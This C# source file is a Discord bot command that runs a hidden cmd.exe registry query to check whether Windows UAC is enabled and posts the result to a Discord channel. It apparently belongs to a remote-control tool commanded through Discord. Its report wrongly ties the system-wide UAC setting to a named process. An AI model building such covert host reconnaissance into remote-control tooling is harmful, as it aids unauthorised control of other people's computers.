using System.Diagnostics;
using System.Threading.Tasks;
using Discord;
using Discord.WebSocket;
using Helper;

namespace Commands
{
    public static class UACCheck
    {
        public static async Task Run(SocketUserMessage msg, string[] parameters)
        {
            var processName = parameters[0];

            var startInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/C reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            };

            var process = new Process { StartInfo = startInfo };
            process.Start();

            await process.WaitForExitAsync();

            var output = await process.StandardOutput.ReadToEndAsync();
            var hasUAC = output.Contains("0x1");

            var serpentEmbed = new SerpentEmbed();
            var embed = serpentEmbed.GetEmbed(hasUAC ? SerpentEmbeds.Success : SerpentEmbeds.Error, "UAC Check", $"The process {processName} {(hasUAC ? "has" : "does not have")} UAC enabled.");
            await msg.Channel.SendMessageAsync(embed: embed);
        }
    }
}

